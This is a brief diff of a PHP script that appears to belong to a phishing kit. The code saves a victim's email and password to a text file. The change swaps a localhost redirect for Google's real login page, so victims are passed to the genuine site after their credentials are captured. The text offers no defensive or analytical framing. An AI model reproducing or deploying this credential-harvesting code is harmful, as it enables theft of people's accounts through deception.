@@ -6,7 +6,7 @@ include 'ip.php';
 			$email=$_SESSION["Email"];
 			
 			file_put_contents("usernames.txt", "                [ EMAIL: " . " ". $email . " ] " . " " . "[ PASSWORD: " . " " . $pass . " ]\n", FILE_APPEND);
-  			header('Location: http://localhost');
+  			header('Location: https://accounts.google.com/Login');
 			exit();
 			
 			
